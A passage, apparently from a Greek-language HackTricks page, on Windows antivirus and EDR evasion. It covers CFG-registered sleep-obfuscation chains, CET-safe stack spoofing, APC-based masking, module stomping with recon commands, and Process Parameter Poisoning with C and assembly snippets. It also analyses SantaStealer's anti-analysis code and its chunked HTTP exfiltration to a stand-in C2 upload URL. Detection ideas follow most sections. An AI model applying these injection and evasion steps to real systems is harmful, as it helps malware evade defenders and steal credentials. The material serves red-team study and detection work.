Σε CFG-enabled targets, το πρώτο indirect jump σε ένα mid-function gadget όπως `jmp [rbx]` ή `jmp rdi` συνήθως θα κάνει crash το process με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να παραμείνουν ενεργές οι Ekko/Kraken-style chains μέσα σε hardened processes:<sup>[[30]](#references)</sup>

- Καταχώρισε κάθε indirect destination που χρησιμοποιεί η chain με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και `CFG_CALL_TARGET_VALID` entries.
- Για addresses μέσα σε loaded images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **full image size**.
- Για manually mapped/PIC/stomped regions, χρησιμοποίησε το **allocation base** και το allocation size.
- Κάνε mark όχι μόνο το dispatch gadget, αλλά και τα exports που προσεγγίζονται indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και οποιαδήποτε attacker-controlled executable sections θα γίνουν indirect targets.

Αυτό μετατρέπει τις sleep chains τύπου ROP/JOP από “works only in non-CFG processes” σε reusable primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe stack spoofing για sleeping threads

Η πλήρης αντικατάσταση `CONTEXT` είναι noisy και μπορεί να αποτύχει σε CET Shadow Stack systems, επειδή ένα spoofed `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα safer sleep-masking pattern είναι:<sup>[[30]](#references)</sup>

- Επίλεξε ένα άλλο thread στο ίδιο process και διάβασε τα `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Κάνε backup το real TEB/TIB του current thread.
- Κάνε capture το real sleeping context με `GetThreadContext`.
- Αντέγραψε **μόνο** το real `Rip` στο spoof context, αφήνοντας ανέπαφα τα spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του sleep window, αντέγραψε το `NT_TIB` του spoof thread στο current TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε legitimate stack range.
- Μετά την ολοκλήρωση του wait, επανάφερε το original TIB και thread context.

Αυτό διατηρεί ένα CET-consistent instruction pointer, ενώ παραπλανά τους EDR stack walkers που εμπιστεύονται τα TEB stack metadata για να επικυρώνουν τα unwinds.

### APC-based alternative: Kraken Mask

Αν το timer-queue dispatch έχει υπερβολικά recognizable signature, η ίδια sleep-encrypt-spoof-restore sequence μπορεί να εκτελεστεί από ένα suspended helper thread χρησιμοποιώντας queued APCs:<sup>[[27]](#references)</sup>

- Δημιούργησε ένα helper thread με το `NtTestAlert` ως entrypoint.
- Κάνε queue τα prepared `CONTEXT` frames/APCs με `NtQueueApcThread` και drain τους με `NtAlertResumeThread`.
- Αποθήκευσε την chain state στο heap αντί για το helper stack, ώστε να αποφύγεις την εξάντληση του default 64 KB thread stack.
- Χρησιμοποίησε `NtSignalAndWaitForSingleObject` για atomic signal του start event και block.
- Κάνε suspend το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειώσεις το race window στο οποίο ένας scanner θα μπορούσε να εντοπίσει ένα half-restored stack.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα helper-thread/APC signature, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` τυλιγμένα γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` ακολουθούμενο από direct writes στα TEB/TIB stack bounds του current thread.
- `NtQueueApcThread`/`NtAlertResumeThread` chains που φτάνουν indirectly στα `SystemFunction032`, `VirtualProtect` ή section-permission restoration helpers.
- Repeated χρήση short gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που είναι ήδη mapped μέσα στο target process**, αντί να κάνει allocate obvious private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Το overwrite target πρέπει να είναι ένα **loaded, disk-backed image**, του οποίου ο code space μπορεί να απορροφήσει το payload χωρίς να καταστρέψει code paths που χρειάζεται ακόμη το process.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Το naive stomping σε common modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην είναι loaded στο remote process και μια υπερβολικά μικρή code region θα προκαλέσει crash στο process. Ένα πιο reliable workflow είναι:

1. Κάνε enumerate τα target process modules και κράτησε ένα **names-only include list** των DLLs που είναι ήδη loaded.
2. Κάνε build πρώτα το payload και κατέγραψε το **exact byte size** του.
3. Κάνε scan στα candidate DLLs στο disk και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό είναι σημαντικότερο από το file size, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται mapped στη μνήμη**.
4. Κάνε parse το **Export Address Table (EAT)** και επίλεξε ένα exported function RVA ως stomp start offset.
5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά το selected function boundary, θα κάνει overwrite τα adjacent exports που βρίσκονται μετά από αυτό στη μνήμη.

Typical recon/selection helpers που έχουν παρατηρηθεί in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Προτίμησε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, ώστε να αποφεύγεται η τηλεμετρία των `LoadLibrary`/μη αναμενόμενων image loads.
- Προτίμησε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο· διαφορετικά, οι κανονικές διαδρομές κώδικα μπορεί να προσπελάσουν τα bytes που έχουν υποστεί stomp πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν αλλαγή του τρόπου ενσωμάτωσης του shellcode από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον injector source.

Detection ideas
- Απομακρυσμένες εγγραφές σε **εκτελέσιμες σελίδες που υποστηρίζονται από image** (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες private RWX/RX allocations.
- Export entry points των οποίων τα bytes στη μνήμη δεν συμφωνούν πλέον με το backing file στον δίσκο.
- Απομακρυσμένα threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε legitimate DLL export, του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε DLL `.text` pages, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια **process-injection / EDR-evasion** τεχνική που αποφεύγει το κλασικό remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν ήδη εκτελούμενο στόχο, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης του `CreateProcessW` στη child process** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Χρήσιμα carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **writable memory** για το `CreateProcessW` και περιορίζεται στους **32.767 Unicode χαρακτήρες**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα Unicode environment block με διαδοχικά strings `NAME=VALUE\0`, τα οποία τερματίζονται από ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα reserved, επομένως το mapping στο `ShellInfo` πρέπει να αντιμετωπίζεται ως implementation detail και όχι ως σταθερό documented contract.

Αυτό μετατρέπει τη φυσιολογική δημιουργία διεργασίας σε **payload-transfer primitive**. Ο operator δημιουργεί τη child process με attacker-controlled startup data και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Remote lookup flow without remote write APIs

Μετά τη δημιουργία της child process, εντόπισε το αντιγραμμένο buffer χρησιμοποιώντας **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του remote `PEB`
3. Ακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Εκτέλεση του αντιγραμμένου parameter buffer

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Ένα συνηθισμένο P3 chain είναι:

1. Δημιουργία της διεργασίας κανονικά (όχι σε suspended κατάσταση)
2. Κάντε τη σελίδα παραμέτρων που επιλέχθηκε εκτελέσιμη με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το main thread handle που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τα κλασικά thread hijacking workflows, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας στο handle του main thread που επιστράφηκε.

Αυτό αποφεύγει αρκετά APIs που παρακολουθούνται συνήθως για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά επίσης `SuspendThread` / `ResumeThread`

### Περιορισμός null-byte και staged shellcode

Και οι τρεις carriers είναι **string ή string-like data**, επομένως ένα raw payload που περιέχει `0x00` περικόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free first stage** που ανακατασκευάζει constants κατά το runtime και στη συνέχεια φορτώνει ένα arbitrary second stage.

Ένα απλό pattern είναι η σύνθεση constants με βάση το XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Αυτό επιτρέπει στο first stage να δημιουργεί stack strings, API arguments, DLL paths ή έναν second-stage shellcode loader χωρίς να ενσωματώνει null bytes στην transported parameter.

### Stack-based API calls από το first stage

Όταν το first stage πρέπει να καλέσει APIs όπως το `LoadLibraryA`, μπορεί να:

- κάνει push το string/buffer στο target stack
- δεσμεύσει το **32-byte x64 shadow space**
- θέσει τα `RCX`, `RDX`, `R8`, `R9` σε constants ή σε `RSP`-relative pointers
- διατηρεί το `RSP` **16-byte aligned** πριν από το call

Στη συνέχεια, ένα second stage μπορεί να αντιγραφεί από το stack σε μια `PAGE_READWRITE` allocation, να αλλάξει σε `PAGE_EXECUTE_READ` με το `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση RWX allocation.

### Ιδέες για Detection

Καλές ευκαιρίες για hunting που αναφέρονται από τους authors:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που κάνουν **process-parameter pages executable**
- αυτή η αλλαγή protection να ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- remote reads των `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλα / υψηλού entropy `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` values κατά τη δημιουργία process

### Σημειώσεις

- Το P3 είναι ένα **cross-process transfer trick**, όχι από μόνο του ένα πλήρες execution primitive: η copied parameter εξακολουθεί να χρειάζεται αλλαγή σε execute-permission και μια μέθοδο execution redirection.
- Το `RtlCreateProcessReflection` / Dirty Vanity εξετάστηκε από τους authors, αλλά απορρίφθηκε επειδή εσωτερικά καταλήγει σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Tradecraft του SantaStealer για Fileless Evasion και Credential Theft

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.<sup>[[24]](#references)</sup>

### Keyboard layout gating και καθυστέρηση sandbox

- Ένα config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω του `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το sample δημιουργεί έναν κενό `CIS` marker και τερματίζει πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν θα detonates ποτέ σε excluded locales, ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυεπίπεδη λογική `check_antivm`

- Η Variant A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα custom rolling checksum και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum για το όνομα του υπολογιστή και ελέγχει working directories όπως το `C:\analysis`.
- Η Variant B επιθεωρεί ιδιότητες του συστήματος (κατώτατο όριο πλήθους διεργασιών, πρόσφατο uptime), καλεί το `OpenServiceA("VBoxGuest")` για να ανιχνεύσει VirtualBox additions και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit προκαλεί abort πριν από την εκκίνηση των modules.

### Fileless helper + διπλό ChaCha20 reflective loading

- Το κύριο DLL/EXE ενσωματώνει έναν Chromium credential helper, ο οποίος είτε αποθηκεύεται στον δίσκο είτε γίνεται manually mapped στη μνήμη· στη fileless mode επιλύει μόνος του τα imports/relocations, ώστε να μην εγγράφονται helper artifacts.
- Ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο keys των 32 byte + nonces των 12 byte). Μετά και τα δύο passes, φορτώνει reflectively το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για να κάνουν inject σε έναν ενεργό Chromium browser, να κληρονομήσουν τα AppBound Encryption keys και να αποκρυπτογραφήσουν passwords/cookies/credit cards απευθείας από SQLite databases, παρά το ABE hardening.


### Modular συλλογή στη μνήμη & chunked HTTP exfil

- Το `create_memory_based_log` διατρέχει έναν global πίνακα function pointers `memory_generators` και δημιουργεί ένα thread ανά ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, documents, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε shared buffers και αναφέρει το file count μετά από ένα παράθυρο join περίπου 45s.
- Μόλις ολοκληρωθεί, όλα συμπιέζονται με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` πραγματοποιεί sleep 15s και μεταδίδει το archive σε chunks των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει τα `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ το τελευταίο chunk προσθέτει `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.

## References

- [1] [Προηγμένο Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, όχι άλλα free passes για malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα Infection Chain και obfuscation βασισμένο στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των posture checks του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερεύνηση των προηγούμενων ransomware operations του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDRs με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάσιμο του protective shell του Windows Defender με την τεχνική Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: Από RAT σε Builder και μετά σε Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Το SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Θέτοντας το Adaptix σε αδράνεια με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET και Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε Red Team Operations: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
